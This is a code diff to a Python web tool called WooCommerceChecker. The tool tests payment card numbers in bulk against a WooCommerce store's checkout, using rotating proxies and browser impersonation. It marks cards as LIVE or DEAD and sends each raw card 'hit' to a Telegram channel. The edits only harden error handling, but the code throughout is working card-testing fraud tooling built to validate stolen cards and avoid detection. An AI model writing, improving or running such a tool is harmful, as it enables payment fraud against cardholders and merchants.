@@ -208,8 +208,8 @@ class WooCommerceChecker:
                 if attempt > 0:
                     proxy = self._pick_proxy()
 
-                async with AsyncSession(impersonate="chrome120", proxy=proxy, verify=True) as session:
-                    try:
+                try:
+                    async with AsyncSession(impersonate="chrome120", proxy=proxy, verify=True) as session:
                         await session.get(CART_URL, timeout=8)
                         if FORCED_PRODUCT_ID:
                             await session.get(CART_URL, params={"add-to-cart": FORCED_PRODUCT_ID, "quantity": "1"}, timeout=8)
@@ -273,10 +273,10 @@ class WooCommerceChecker:
                             asyncio.create_task(TelegramNotifier.send_alert(f"<b>🔥 WEB MASS HIT 🔥</b>\n💳 <code>{card.raw}</code>\n💬 <code>{reason}</code>"))
 
                         return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)
-                    except Exception as exc:
-                        if attempt == 1:
-                            return CheckResult(card=card, status="ERROR", reason=str(exc), latency_ms=(time.perf_counter() - t0) * 1000.0)
-                        await asyncio.sleep(0.5)
+                except Exception as exc:
+                    if attempt == 1:
+                        return CheckResult(card=card, status="ERROR", reason=str(exc), latency_ms=(time.perf_counter() - t0) * 1000.0)
+                    await asyncio.sleep(0.5)
 
         return CheckResult(card=card, status="ERROR", reason="Max retries reached", latency_ms=(time.perf_counter() - t0) * 1000.0)
 
@@ -411,10 +411,15 @@ HTML_TEMPLATE = """
                     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                     body: `card=${encodeURIComponent(card)}&proxy=${encodeURIComponent(proxy)}`
                 });
+                
+                if (!response.ok) {
+                    throw new Error(`Server error: ${response.status} ${response.statusText}`);
+                }
+
                 const data = await response.json();
                 appendResult(data);
             } catch (err) {
-                resultBox.innerHTML += `<div class="text-rose-500">[ERROR] Request failed: ${err}</div>`;
+                resultBox.innerHTML += `<div class="text-rose-500">[ERROR] Request failed: ${err.message}</div>`;
             }
 
             btn.disabled = false;
@@ -441,12 +446,16 @@ HTML_TEMPLATE = """
                     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                     body: `cards=${encodeURIComponent(cards)}&proxies=${encodeURIComponent(proxies)}&threads=${encodeURIComponent(threads)}`
                 });
-                const results = await response.json();
 
+                if (!response.ok) {
+                    throw new Error(`Server error: ${response.status} ${response.statusText}`);
+                }
+
+                const results = await response.json();
                 results.forEach(res => appendResult(res));
                 resultBox.innerHTML += `<div class="text-emerald-400">[*] Mass check completed! Processed ${results.length} cards.</div>`;
             } catch (err) {
-                resultBox.innerHTML += `<div class="text-rose-500">[ERROR] Mass check failed: ${err}</div>`;
+                resultBox.innerHTML += `<div class="text-rose-500">[ERROR] Mass check failed: ${err.message}</div>`;
             }
 
             btn.disabled = false;
@@ -456,11 +465,13 @@ HTML_TEMPLATE = """
 
         function appendResult(data) {
             let color = 'text-slate-300';
+            const latency = (data.latency_ms !== undefined && !isNaN(data.latency_ms)) ? data.latency_ms.toFixed(0) : '0';
+            
             if (data.status === 'LIVE') color = 'text-emerald-400 font-bold';
             else if (data.status === 'DEAD') color = 'text-rose-400';
             else if (data.status === 'ERROR') color = 'text-amber-400';
 
-            resultBox.innerHTML += `<div class="${color}">[${data.status}] ${data.card} -> ${data.reason} (${data.latency_ms.toFixed(0)}ms)</div>`;
+            resultBox.innerHTML += `<div class="${color}">[${data.status}] ${data.card} -> ${data.reason} (${latency}ms)</div>`;
         }
     </script>
 </body>
@@ -472,38 +483,47 @@ async def index() -> str:
     return HTML_TEMPLATE
 
 @app.post("/api/check")
-async def api_check(card: str = Form(...), proxy: str = Form(...)) -> dict[str, Any]:
-    parsed_card = parse_card_line(card)
-    if not parsed_card:
-        return {"card": card, "status": "ERROR", "reason": "Invalid card format or failed Luhn check", "latency_ms": 0}
+async def api_check(card: str = Form(...), proxy: str = Form("")) -> dict[str, Any]:
+    try:
+        parsed_card = parse_card_line(card)
+        if not parsed_card:
+            return {"card": card, "status": "ERROR", "reason": "Invalid card format or failed Luhn check", "latency_ms": 0}
 
-    proxies_list = [proxy.strip()] if proxy and proxy.strip() else []
-    checker = WooCommerceChecker(proxies=proxies_list, max_concurrency=1)
-    res = await checker.check_card(parsed_card)
-    return {"card": res.card.raw, "status": res.status, "reason": res.reason, "latency_ms": res.latency_ms}
+        proxies_list = [proxy.strip()] if proxy and proxy.strip() else []
+        checker = WooCommerceChecker(proxies=proxies_list, max_concurrency=1)
+        res = await checker.check_card(parsed_card)
+        return {"card": res.card.raw, "status": res.status, "reason": res.reason, "latency_ms": res.latency_ms}
+    except Exception as e:
+        return {"card": card, "status": "ERROR", "reason": f"Server Exception: {str(e)}", "latency_ms": 0}
 
 @app.post("/api/mass-check")
-async def api_mass_check(cards: str = Form(...), proxies: str = Form(...), threads: int = Form(8)) -> list[dict[str, Any]]:
-    parsed_cards = [parse_card_line(l) for l in cards.splitlines() if parse_card_line(l)]
-    parsed_proxies = [p.strip() for p in proxies.splitlines() if p.strip() and not p.strip().startswith("#")]
+async def api_mass_check(cards: str = Form(...), proxies: str = Form(""), threads: int = Form(8)) -> list[dict[str, Any]]:
+    try:
+        parsed_cards = [parse_card_line(l) for l in cards.splitlines() if parse_card_line(l)]
+        parsed_proxies = [p.strip() for p in proxies.splitlines() if p.strip() and not p.strip().startswith("#")]
 
-    if not parsed_cards:
-        return [{"card": "N/A", "status": "ERROR", "reason": "No valid Luhn cards provided", "latency_ms": 0}]
+        if not parsed_cards:
+            return [{"card": "N/A", "status": "ERROR", "reason": "No valid Luhn cards provided", "latency_ms": 0}]
 
-    checker = WooCommerceChecker(proxies=parsed_proxies, max_concurrency=threads)
-    
-    tasks = [checker.check_card(c) for c in parsed_cards]
-    results = await asyncio.gather(*tasks)
+        checker = WooCommerceChecker(proxies=parsed_proxies, max_concurrency=threads)
+        
+        tasks = [checker.check_card(c) for c in parsed_cards]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
 
-    return [
-        {
-            "card": r.card.raw,
-            "status": r.status,
-            "reason": r.reason,
-            "latency_ms": r.latency_ms,
-        }
-        for r in results
-    ]
+        output = []
+        for r in results:
+            if isinstance(r, Exception):
+                output.append({"card": "Unknown", "status": "ERROR", "reason": str(r), "latency_ms": 0})
+            else:
+                output.append({
+                    "card": r.card.raw,
+                    "status": r.status,
+                    "reason": r.reason,
+                    "latency_ms": r.latency_ms,
+                })
+        return output
+    except Exception as e:
+        return [{"card": "N/A", "status": "ERROR", "reason": f"Mass Check Exception: {str(e)}", "latency_ms": 0}]
 
 if __name__ == "__main__":
     import uvicorn
